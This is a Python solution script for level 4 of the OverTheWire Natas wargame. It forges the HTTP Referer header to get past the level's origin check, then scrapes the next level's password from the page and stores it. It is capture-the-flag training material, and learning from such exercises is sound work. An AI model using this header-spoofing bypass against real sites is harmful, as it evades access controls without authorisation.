import re
import requests
from bs4 import BeautifulSoup
from natas_utils import *

LEVEL = 4
LEVEL_URL, LOGIN = load_level(LEVEL)

def main():
    # recon indicates that 'authorized users should come only from "http://natas5.natas.labs.overthewire.org/"'
    # solution: set custom referer header

    # trailing '/' is needed for a string match
    natas5_url = NATAS_DATA["level_url_format"].format(5) + '/'
    response = requests.get(LEVEL_URL, auth=LOGIN, headers={"Referer": natas5_url})
    # print(response.text)

    soup = BeautifulSoup(response.text, "html.parser")

    # overkill, since there's only one password in the page
    candidate_passwords = re.findall(PW_FORMAT, soup.find("div", attrs={"id": "content"}).text)
    natas5_password = try_level_login(LEVEL + 1, candidate_passwords)

    if natas5_password:
        print("natas5:", natas5_password)
        store_level_password(LEVEL + 1, natas5_password)

if __name__ == "__main__":
    main()